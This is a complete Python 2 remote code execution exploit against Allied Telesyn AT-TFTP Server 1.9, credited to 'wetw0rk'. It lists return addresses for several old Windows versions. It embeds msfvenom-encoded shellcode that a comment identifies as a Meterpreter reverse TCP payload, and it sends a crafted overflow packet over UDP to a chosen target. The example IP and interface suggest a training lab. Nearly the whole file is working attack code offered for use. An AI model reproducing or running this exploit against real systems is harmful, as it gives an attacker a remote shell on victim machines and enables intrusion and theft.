#!/usr/bin/env python
#
# Script name	: allied-tftp-server-sploit.py
# Req Modules	: netifaces
# Author	: wetw0rk
# Discovered by	: liuqx@nipc.org.cn
# Version	: 1.0
# Python Vers.	: 2.7
# Description	: This exploit allows for remote code execution on
#		  the Allied Telesyn AT-TFTP Server/Daemon 1.9
#

import sys, socket, struct
import netifaces as ni

# Return Address's
return_addess = {'0':	0x702ea6f7,	# Windows NT_SP4 English
		'1':	0x750362c3,	# Windows 2000 SP0 English
		'2':	0x75031d85,	# Windows 2000 SP1 English
		'3':	0x7503431b,	# Windows 2000 SP2 English
		'4':	0x74fe1c5a,	# Windows 2000 SP3 English
		'5':	0x75031dce,	# Windows 2000 SP4 English
		'6':	0x71ab7bfb,	# Windows XP SP0/1 English
		'7':	0x71ab9372,	# Windows XP SP2 English
		'8':	0x7e429353,	# Windows XP SP3 English
		'9':	0x7c86fed3,	# Windows Server 2003
		'10':	0x7c86a01b}	# Windows Server 2003 SP2

print "--------------------------------------------------------------"
print "- Allied Telesyn AT-TFTP Server/Daemon 1.9 Remote Exploit"
print "- Exploit discovered by liuqx@nipc.org.cn, ported by wetw0rk"

try:

	target		= sys.argv[1]
	port		= int(sys.argv[2])
	ret		= return_addess[str(sys.argv[3])]
	interface	= sys.argv[4]

except IndexError:

	print "- Usage: %s <target> <port> <version> <interface>" % sys.argv[0]
	print "- Example: %s 10.11.1.226 69 4 tap0" % sys.argv[0]
	print "- Targets:"
	print '-\t0\tWindows NT_SP4 English'
	print '-\t1\tWindows 2000 SP0 English'
	print '-\t2\tWindows 2000 SP1 English'
	print '-\t3\tWindows 2000 SP2 English'
	print '-\t4\tWindows 2000 SP3 English'
	print '-\t5\tWindows 2000 SP4 English'
	print '-\t6\tWindows XP SP0/1 English'
	print '-\t7\tWindows XP SP2 English'
	print '-\t8\tWindows XP SP3 English'
	print '-\t9\tWindows Server 2003'
	print '-\t10\tWindows Server 2003 SP2'
	sys.exit()

# msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=X LPORT=X -f raw -o msfvenom_payload
# echo -en "\x81\xec\xac\x0d\x00\x00" > stack_adjustment
# cat stack_adjustment msfvenom_payload > adjusted_shellcode
# cat adjusted_shellcode | msfvenom -p - -b "\x00" -a x86 EXITFUNC=thread --platform Windows -f python
buf =  ""
buf += "\xba\x3b\x46\xce\x07\xdb\xcc\xd9\x74\x24\xf4\x5b\x31"
buf += "\xc9\xb1\x2e\x83\xeb\xfc\x31\x53\x11\x03\x53\x11\xe2"
buf += "\xce\xc7\x22\xab\x3d\xc8\xba\x48\x57\x23\xfd\x58\x5e"
buf += "\x4c\xfd\x66\xc0\x82\xd9\x12\x7d\xd9\x56\x58\x40\x59"
buf += "\x68\x4e\x31\xce\x4a\x91\xaf\x7a\xbe\x0b\x2e\x93\x8e"
buf += "\xeb\xa9\xc7\x30\x21\xc4\x16\x71\x32\x16\x6d\x83\x78"
buf += "\xf0\xb7\xa1\x0a\x1f\x8c\xbe\xba\xfb\x12\x28\x22\x88"
buf += "\x09\xf3\x20\xc1\x2d\x02\xde\xde\x61\x9d\xa9\x8c\x5d"
buf += "\x81\xc8\xb3\x7e\x88\xd1\x2f\xf4\xa8\xd5\x24\x4a\x23"
buf += "\x9d\x4a\x57\x96\x2a\xc2\x6f\xb6\x4a\x41\x16\x2e\xa0"
buf += "\x57\xbe\xd9\xb5\xa5\x61\x72\x5c\x70\xef\x1a\x5f\x54"
buf += "\x85\x88\xcc\x0b\xf5\x6d\xa0\xe8\xaa\xf8\xa1\x88\xcd"
buf += "\x14\x25\x56\x99\xb9\x50\xef\xc2\xe1\x62\xd9\x6b\xa7"
buf += "\x35\x8a\x8c\x01\xd2\x3c\xb3\x06\xdd\xb7\x55\x3f\xde"
buf += "\xc5\xff\xec\x57\x2a\x95\x02\x3b\xfb\x0c\x9a\xec\x06"
buf += "\x2e\x0a\x42\xbc\xdc\xe3\x30\xeb\x8f\x65\x0e\xd3\x08"
buf += "\x95\x96"

# Get Users IP From Interface
ni.ifaddresses(interface)
ip = ni.ifaddresses(interface)[2][0]['addr']
lhost = ip
print "- Sending Exploit To %s:%s" % (target, port)
# UDP Socket via IPV4
udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# Exploit
exploit = "\x00\x02" + "\x90" * (25 - len(lhost))
exploit += buf
exploit += struct.pack('<L', ret)
exploit += "\x83\xc4\x28\xc3\x00netascii\x00"
# Send Of the Exploit
print "- Sending Exploit Via UDP"
udp_sock.sendto(exploit, (target, port))


